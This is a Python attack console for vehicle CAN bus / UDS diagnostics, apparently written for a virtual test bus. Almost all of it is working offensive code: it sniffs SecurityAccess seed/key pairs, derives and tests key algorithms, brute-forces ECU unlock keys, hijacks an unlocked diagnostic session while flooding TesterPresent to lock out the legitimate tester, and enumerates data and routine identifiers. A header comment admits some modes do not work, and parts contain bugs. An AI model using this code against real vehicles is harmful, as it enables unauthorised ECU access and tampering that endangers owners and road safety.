import can, isotp
import time, sys, select, struct
import funcs
#MITM BROKE, BRUTE DOESNT WORK ON 2BYTES KEY
# Change to your interface
bus = can.interface.Bus(channel='vcan0', bustype='socketcan', bitrate=500000)

address = isotp.Address(
    isotp.AddressingMode.Normal_11bits,
    txid=0x7E0,  # Tester → ECU
    rxid=0x7E8   # ECU → Tester
)

stack = isotp.CanStack(bus=bus, address=address)

# ------------------- Flow Control & Reassembly Buffers -------------------
class Flow:
    def __init__(self):
        self.data = bytearray()
        self.expected_sn = 1  # next consecutive frame sequence number (1-15, then 0)

flows = {}  # key = arbitration_id of the flow (0x7E0 or 0x7E8)

def keep_alive(stack):
    """Send a TesterPresent message and check ECU response."""
    stack.send(b'\x3E\x00')  # UDS TesterPresent
    while stack.transmitting():
        stack.process()

    # Optional: Check if ECU responds at all
    response = funcs.rec_msg(stack)
    if not response:
        return False  # ECU disconnected
    return True

def process_single_frame(arbitration_id, data):
    if len(data) < 2:
        return None
    pci = data[0]
    if pci & 0xF0 == 0x00:          # Single Frame
        length = pci & 0x0F
        if len(data) >= 1 + length:
            return bytes(data[1:1+length])
    return None


def process_first_frame(arbitration_id, data):
    if len(data) < 6 or data[0] & 0xF0 != 0x10:
        return
    payload = data[2:]
    flow = flows.setdefault(arbitration_id, Flow())
    flow.data = bytearray(payload)
    flow.expected_sn = 1
    # Send FlowControl "Continue" immediately (CTS)
    fc = bytes([0x30, 0x00, 0x00]) + b'\x00' * 5
    try:
        bus.send(can.Message(arbitration_id=(arbitration_id ^ 0x08), data=fc, is_extended_id=False))
    except Exception:
        pass


def process_consecutive_frame(arbitration_id, data):
    if arbitration_id not in flows:
        return
    flow = flows[arbitration_id]
    sn = data[0] & 0x0F
    if sn != flow.expected_sn:
        print(f"[!] Sequence error, got {sn}, expected {flow.expected_sn}")
        del flows[arbitration_id]
        return
    payload = data[1:]
    flow.data.extend(payload)
    flow.expected_sn = (flow.expected_sn + 1) & 0x0F
    if len(flow.data) >= 4095:  # safety
        del flows[arbitration_id]

#------------------ MITM---------------------------------
def MITM_func():
    print("MITM MODE ACTIVATED — WAITING FOR SOMEONE TO UNLOCK THE ECU...")
    print("When 67 02 is seen → session will be stolen instantly!")

    # Reset any old state
    global captured_seed, captured_key
    captured_seed = captured_key = None

    # Tight polling loop — we MUST catch the 67 02 frame ourselves
    while True:
        msg = bus.recv(timeout=0.01)  # ultra-fast polling
        if msg is None:
            # Check for user abort
            if user_input_available():
                cmd = sys.stdin.readline().strip().lower()
                if cmd in ["q", "quit", "exit", ""]:
                    print("MITM mode cancelled.")
                    return
                continue
            time.sleep(0.001)
            continue

        data = msg.data
        arb_id = msg.arbitration_id

        # Parse single frame
        payload = process_single_frame(arb_id, data)
        if not payload or len(payload) < 2:
            continue

        # WE GOT THE UNLOCK RESPONSE → HIJACK NOW!
        if arb_id == 0x7E8 and payload[0] == 0x67 and payload[1] == 0x02:
            print("SESSION HIJACK EXECUTED!")

            # === INSTANT RAW INJECTION (this beats every ECU timeout) ===
            bus.send(can.Message(
                arbitration_id=0x7E0,
                data=b'\x02\x10\x03',  # 10 03 = Extended Diagnostic Session
                is_extended_id=False
            ))
            print("   → 10 03 injected (<5ms) → Extended session stolen!")

            time.sleep(0.03)

            # Lock out original tester with TesterPresent spam
            for i in range(6):
                bus.send(can.Message(
                    arbitration_id=0x7E0,
                    data=b'\x01\x3E\x00',  # 3E 00
                    is_extended_id=False
                ))
                time.sleep(0.008)
            return

#----------------- Seed BruteForce --------------------------
def seed_Brute_force():

    global active_key 
    if active_key is not None :
        return
    
    print("\n=== SEED-KEY BRUTE FORCE ATTACK STARTED ===\n")

    # STEP 1: Request seed (27 01) – MUST DO FIRST!
    print("1. Sending 27 01 → requesting seed...")
    seed_resp = funcs.send_and_receive(stack, b'\x27\x01', timeout=1.0)

    if not seed_resp or seed_resp[:2] != b'\x67\x01':
        print("ERROR: No seed received! Check CAN IDs / ECU power.")
        return

    seed_hex = seed_resp[2:6].hex()
    print(f"   Seed received: 0x{seed_hex}\n")


    # STEP 2: Brute force with 27 02 + key
    print("2. Trying keys around 0x11223344...\n")

    # if active_key is None :
    for key_int in range(0x1122328B , 0x11223355):
        key_bytes = key_int.to_bytes(4, 'big')
        payload = b'\x27\x02' + key_bytes

        resp = funcs.send_and_receive(stack, payload, timeout=0.3)

        # PRINT BOTH WHAT WE SEND AND ECU RESPONSE
        resp_hex = resp.hex() if resp else "NO RESPONSE"
        print(f"   Sent: 2702{key_bytes.hex():>8}  →  ECU: {resp_hex}")

        # CHECK FOR UNLOCK!
        if resp == b'\x67\x02':
            active_key = key_int

            print(f"\nUNLOCKED SUCCESSFULLY!")
            print(f"   KEY = 0x{key_int:08X}  →  {key_bytes.hex()}")
            print(f"   Seed was 0x{seed_hex}")
            # Take full control
            funcs.send_and_receive(stack, b'\x10\x03')
            funcs.send_and_receive(stack, b'\x3E\x00')

            return

    print("\nKey not found in range ")

#----------------- DID Enumeration -------------------------
def DID_Enumeration():
    print("Starting fast DID scan (0x22)...")

    global DIDs_List

    # Method 2: Check if list exists AND is not empty
    if DIDs_List and not DIDs_List.empty():
        return
    
    for did in range(0xF100, 0xF200):           # F100 to F200
        # if did % 0x100 == 0:
        #     print(f"   scanning 0x{did:04X}...")
            # keep_alive(stack)                   # keep alive
            payload = b'\x22' + did.to_bytes(2, 'big')
            resp = funcs.send_and_receive(stack,payload,timeout=1.0)
            if resp is None:
                return

            if resp[0] == 0x62 or resp[2] == 0x33:            # 62 = positive response
                print(f"DID 0x{did:04X} → YES | {resp[3:].hex()}")
                DIDs_List.append(did)
        
    print(f"\nFound {len(DIDs_List)} DIDs → {[hex(x) for x in DIDs_List]}")
    print("Done. You now know everything the ECU can read.")

#----------------- RID Enumeration -------------------------

def RID_Enumeration():
    print("Starting fast RID scan (0x31)...")

    global RIDs_List

    # Method 2: Check if list exists AND is not empty
    if RIDs_List and not RIDs_List.empty():
        return
    
    for RID in range(0x1200, 0x1400):           # F100 to F200
            payload = b'\x31'+ b'\x01' + RID.to_bytes(2, 'big')
            resp = funcs.send_and_receive(stack,payload,timeout=1.0)
            if resp is None:
                return

            if resp[0] == 0x71 or resp[2] == 0x22:            # 62 = positive response
                print(f"RID 0x{RID:04X} → YES | {resp[4:].hex()}")
                RIDs_List.append(RID)
        
    print(f"\nFound {len(RIDs_List)} RIDs → {[hex(x) for x in RIDs_List]}")
    print("Done. You now know everything the ECU can read.")    

#----------------- PID Enumeration -------------------------

def PID_Enumeration():
    print("Starting fast PID scan (0x01)...")

    global PIDs_List
    resp = None
    # Method 2: Check if list exists AND is not empty
    if PIDs_List and not PIDs_List.empty():
        return
    
    for PID in range(0x00, 0x100):           # Fixed range: 0x00 to 0xFF (0x100 is exclusive)
        payload = b'\x01' + PID.to_bytes(1, 'big')  # Fixed syntax error
        resp = funcs.send_and_receive(stack, payload, timeout=1.0)
        
        if resp is None:
            print(f"No response for PID 0x{PID:02X}, continuing...")
            continue  # Continue instead of return to finish scanning

        if resp[0] == 0x41:  # 0x41 = positive response for mode 0x01
            print(f"PID 0x{PID:02X} → YES | {resp[1:].hex().upper()}")  # Fixed response parsing
            PIDs_List.append(PID)  # Fixed: Should be PIDs_List, not RIDs_List
        
    print(f"\nFound {len(PIDs_List)} PIDs → {[hex(x) for x in PIDs_List]}")
    print("Done. You now know everything the ECU can read.")

# ---------------- Attack Patterns ( REVERSE) ----------------
def reverse_pattern2(seed, xor_const):
    # Pattern: seed ^ xor_const  (reverse XOR is xor)
    return seed ^ xor_const


def add_pattern(seed, add_key):
    return (add_key - seed) & 0xFFFFFFFF


def sub_pattern(seed, sub_key):
    return (sub_key + seed) & 0xFFFFFFFF


def multiplier_pattern(seed: int, key: int):
    s = seed & 0xFFFFFFFF
    k = key & 0xFFFFFFFF
    # Try modular inverse
    try:
        inv = pow(s, -1, 0x100000000)
        m = (k * inv) & 0xFFFFFFFF
        if (s * m) & 0xFFFFFFFF == k:
            return m
    except Exception:
        pass
    # Brute force small multiplier
    for m in range(1, 0x200000):
        if (s * m) & 0xFFFFFFFF == k:
            return m
    return None


def generate_candidates(seed, key):
    candidates = []
    c = reverse_pattern2(seed, key)
    if c is not None:
        candidates.append({"op": "xor", "constant": c, "key": seed ^ c})
    c = add_pattern(seed, key)
    if c is not None:
        candidates.append({"op": "add", "constant": c, "key": (seed + c) & 0xFFFFFFFF})
    c = sub_pattern(seed, key)
    if c is not None:
        candidates.append({"op": "sub", "constant": c, "key": (seed - c) & 0xFFFFFFFF})
    c = multiplier_pattern(seed, key)
    if c is not None:
        candidates.append({"op": "mul", "constant": c, "key": (seed * c) & 0xFFFFFFFF})
    return candidates


def try_candidates_with_ecu(seed_from_observation, candidates, bus):
    print("\n[ECU TEST] Starting verification against ECU (this will block briefly)...")

    # 1) Send 27 01
    try:
        msg = can.Message(arbitration_id=0x7E0, data=bytes([0x02, 0x27, 0x01]), is_extended_id=False)
        bus.send(msg)
    except Exception as e:
        print("[ECU TEST] Failed to send 27 01:", e)
        return None
    print(" → Sent 27 01")

    # Wait for 67 01 (short timeout)
    ecu_seed = None
    t0 = time.time()
    while time.time() - t0 < 0.5:
        resp = bus.recv(timeout=0.05)
        if resp and resp.arbitration_id == 0x7E8:
            p = process_single_frame(0x7E8, resp.data)
            if p and len(p) >= 6 and p[0] == 0x67 and p[1] == 0x01:
                ecu_seed = struct.unpack(">I", p[2:6])[0]
                print(f" ← ECU Seed = 0x{ecu_seed:08X}")
                break

    if ecu_seed is None:
        print("[!] No 67 01 received. ECU not responding to 27 01.")
        return None

    # 2) Try candidates
    for c in candidates:
        op = c["op"]
        const = c["constant"]
        if op == "xor":
            key_to_send = ecu_seed ^ const
        elif op == "add":
            key_to_send = (ecu_seed + const) & 0xFFFFFFFF
        elif op == "sub":
            key_to_send = (const - ecu_seed) & 0xFFFFFFFF
        elif op == "mul":
            key_to_send = (ecu_seed * const) & 0xFFFFFFFF
        else:
            continue

        print(f"\n[TRY] op={op}, const=0x{const:08X}, key=0x{key_to_send:08X}")
        payload = bytes([0x27, 0x02]) + struct.pack(">I", key_to_send)
        sf = bytes([len(payload)]) + payload
        try:
            bus.send(can.Message(arbitration_id=0x7E0, data=sf, is_extended_id=False))
        except Exception as e:
            print(" Failed to send candidate:", e)
            continue
        print(" → Sent 27 02 with candidate key")

        # Wait for 67 02
        t0 = time.time()
        while time.time() - t0 < 0.25:
            resp = bus.recv(timeout=0.02)
            if resp and resp.arbitration_id == 0x7E8:
                p = process_single_frame(0x7E8, resp.data)
                if p and p[0] == 0x67 and p[1] == 0x02:
                    print(" ✓ SUCCESS! ECU unlocked")
                    return {"operation": op, "constant": hex(const), "key": key_to_send}
        print(" ✗ Rejected by ECU (no 67 02)")

    print("\n[FAIL] All candidates rejected by ECU.")
    return None


# ----------------- Flush / Reset -----------------
def flush_can_and_isotp(bus, send_poke=True):
    """Hard flush of CAN RX + ISO-TP internal flows; optionally poke ECU with 3E80."""
    global flows
    # 1) Drain kernel rx buffer
    try:
        while True:
            m = bus.recv(timeout=0.001)
            if m is None:
                break
    except Exception:
        pass
    flows.clear()
    time.sleep(0.03)
    # optionally poke with 3E80 to clear ECU tx queue
    if send_poke:
        try:
            bus.send(can.Message(arbitration_id=0x7E0, data=bytes([0x02, 0x3E, 0x80]), is_extended_id=False))
        except Exception:
            pass
    # drain again
    try:
        while True:
            m = bus.recv(timeout=0.002)
            if m is None:
                break
    except Exception:
        pass
    print("[FLUSH] CAN + ISO-TP buffers reset")


# ------------------- UI and Global State ---------------------
captured_seed = None
captured_key = None
pending_candidates = None
pending_seed = None
active_key = None
DIDs_List =[]
RIDs_List = []
PIDs_List = []

reverse_mode = False   # when True, sniffer captures seed/key and generates candidates (but won't auto try)
running = True

def show_menu():
    status = "ON" if reverse_mode else "OFF"
    print("\n==== Mini Attacker Console ====")
    print(f"[r] Reverse-capture: {status}   [g] Brute-test candidates [m] MitM ")
    print("[ed] Enum DID [er] Enum RID [ep] Enum PID")
    print("  [z] Reset CAN    [q] Quit")
    print("Type a hex payload to send (eg: 3E80 or 27 02 11 22 33 44)")
    print("--------------------------------\n")


def user_input_available():
    return sys.stdin in select.select([sys.stdin], [], [], 0)[0]


def parse_hex_input(raw):
    cleaned = raw.replace(" ", "").replace("0x", "").strip()
    if len(cleaned) % 2 != 0:
        return None
    if not all(c in "0123456789abcdefABCDEF" for c in cleaned):
        return None
    return bytes.fromhex(cleaned)


# -------------- Main loop --------------
print("Attacker sniffer ready. Press 'r' to toggle reverse-capture mode.")
show_menu()

while running:
    # Non-blocking CAN receive (short timeout)
    msg = bus.recv(timeout=0.05)
    if msg:
        arb_id = msg.arbitration_id
        data = msg.data

        # Handle multi-frame flows first
        if data and (data[0] & 0xF0) == 0x10:
            process_first_frame(arb_id, data)
        elif data and (data[0] & 0xF0) == 0x20:
            process_consecutive_frame(arb_id, data)

        # Single-frame payload parsing
        payload = process_single_frame(arb_id, data)
        if payload and len(payload) >= 2:
            # tester -> ECU 0x7E0 (captures 27 02 key)
            if arb_id == 0x7E0 and payload[0] == 0x27 and payload[1] == 0x02 and len(payload) >= 6:
                captured_key = struct.unpack(">I", payload[2:6])[0]
                print(f"[→ ECU] 27 02 Key captured → 0x{captured_key:08X}")

            # ECU -> tester 0x7E8 (captures 67 01 seed and 67 02 unlock)
            if arb_id == 0x7E8:
                if payload[0] == 0x67 and payload[1] == 0x01 and len(payload) >= 6:
                    captured_seed = struct.unpack(">I", payload[2:6])[0]
                    print(f"[← ECU] 67 01 Seed captured → 0x{captured_seed:08X}")
                elif payload[0] == 0x67 and payload[1] == 0x02:
                    print("[← ECU] 67 02 → UNLOCK ACCEPTED")
                    # If reverse mode is ON and we have both, generate candidates
                    if reverse_mode and captured_seed is not None and captured_key is not None:
                        pending_candidates = generate_candidates(captured_seed, captured_key)
                        pending_seed = captured_seed
                        captured_seed = captured_key = None
                        print("\n[!] Candidates generated. Press 'g' to test them against the ECU")
                    else:
                        # leave captured values for manual generation / inspection
                        pass

        # If multi-frame flow completed, treat it
        if arb_id in flows:
            flow = flows[arb_id]
            if len(flow.data) >= 6 and flow.data[0] == 0x67:
                if flow.data[1] == 0x01:
                    captured_seed = struct.unpack(">I", flow.data[2:6])[0]
                    print(f"[← ECU multi] 67 01 Seed → 0x{captured_seed:08X}")
                elif flow.data[1] == 0x02:
                    print("[← ECU multi] 67 02 → UNLOCK")
                    if reverse_mode and captured_seed is not None and captured_key is not None:
                        pending_candidates = generate_candidates(captured_seed, captured_key)
                        pending_seed = captured_seed
                        captured_seed = captured_key = None
                        print("\n[!] Candidates generated. Press 'b' to test them against the ECU")
            # cleanup flow
            if len(flow.data) > 0:
                flows.pop(arb_id, None)

    # Show small prompt occasionally
    # Non-blocking user input check
    if user_input_available():
        raw = sys.stdin.readline().strip()
        if not raw:
            continue
        cmd = raw.lower().strip()

        # Single-letter commands
        if cmd == "q":
            print("Quitting...")
            running = False
            break
        if cmd == "r":
            reverse_mode = not reverse_mode
            print(f"Reverse-capture mode -> {'ON' if reverse_mode else 'OFF'}")
            continue
        if cmd == "g":
            if not pending_candidates:
                print("No candidates available. Capture a seed/key first (enable 'r' and wait for a full unlock).")
                continue
            # flush before attack to ensure consistent state
            flush_can_and_isotp(bus)
            res = try_candidates_with_ecu(pending_seed, pending_candidates, bus)
            if res:
                print("\n[CRACK SUCCESS]")
                print(res)
            else:
                print("\n[CRACK FAILED] None matched.")
            pending_candidates = None
            pending_seed = None
            continue
        if cmd == "er":
            RID_Enumeration()
            continue
        if cmd == "ed":
            DID_Enumeration()
            continue
        if cmd == "ep":
            PID_Enumeration()
            continue
        if cmd == "m":
            MITM_func()
            continue
        if cmd == "b":
            seed_Brute_force()
            continue
        if cmd == "z":
            print("[RESET] Flushing CAN & ISO-TP buffers...")
            flush_can_and_isotp(bus)
            continue

        # Otherwise treat input as hex to send raw single-frame payload
        payload = parse_hex_input(raw)
        if payload is None:
            print("Invalid input. Type single-letter command or hex bytes (e.g. 3e80).")
            continue

        # Build single frame (len + payload) to mimic UDS single-frame
        framed = bytes([len(payload)]) + payload
        try:
            bus.send(can.Message(arbitration_id=0x7E0, data=framed, is_extended_id=False))
            pairs = [raw.replace("0x", "").replace(" ", "").upper()[i:i+2] for i in range(0, len(raw.replace(" ", "").replace("0x", "")), 2)]
            print(f"→ Sent: {' '.join(pairs)}")
        except Exception as e:
            print("Failed to send raw frame:", e)

    # occasional status hint
    time.sleep(0.005)
